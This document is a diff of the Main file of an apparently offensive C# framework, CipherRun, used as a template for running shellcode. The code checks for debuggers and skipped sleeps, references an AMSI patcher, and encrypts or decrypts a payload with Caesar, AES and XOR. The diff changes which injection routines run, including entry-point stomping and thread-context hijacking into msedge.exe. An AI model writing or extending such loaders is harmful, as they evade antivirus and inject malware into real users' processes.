@@ -1,4 +1,4 @@
-﻿/* This File Is a Template For Stuff You Can Do Using The Framework */
+/* This File Is a Template For Stuff You Can Do Using The Framework */
 
 
 using static CipherRun.Heuristics.AntiDebug;
@@ -6,7 +6,7 @@ using static CipherRun.Heuristics.Heuristics;
 using static CipherRun.Patchers.Amsi;
 using CipherRun.Decryptors;
 using CipherRun.Retrievers;
-
+using CipherRun.Templates; // exposes all injection templates
 
 namespace CipherRun
 {
@@ -14,11 +14,11 @@ namespace CipherRun
     {
         static void Main(string[] args)
         {
-            // call heuristic check. if sleep was skipped halt execution
+            //call heuristic check. if sleep was skipped halt execution
             if (Sleep()) { return; }
             if (IsBeingDebugged()) { return; }
-            
-            
+
+
             // encrypt payload
             byte[] buf = Caesar.Encryption.Encrypt(Shellcode.buf);
 
@@ -35,7 +35,7 @@ namespace CipherRun
             byte[] aes_dec_payload = AES.Decrypt(payload, "aes_key", "aes_iv");
 
             // old school? Decrypt The Payload (XOR)
-            byte[] xor_key = { 0x1, 0x3, 0x3, 0x7};
+            byte[] xor_key = { 0x1, 0x3, 0x3, 0x7 };
             byte[] xor_dec_payload = XOR.Decrypt(payload1, xor_key);
 
 
@@ -43,10 +43,14 @@ namespace CipherRun
 
             // call runner. Uncomment your choice
 
-            //// Caesar
-            Caesar.Injection.Inject(buf);
-            Caesar.Hollowing.Hollow(aes_dec_payload);
+
+            Standard.Inject(buf);
+            EntryPointStomping.Inject(aes_dec_payload);
+            ThreadContextHijack.Inject("msedge.exe", buf);
+
             // you got the point ;)
+
+
         }
     }
 }
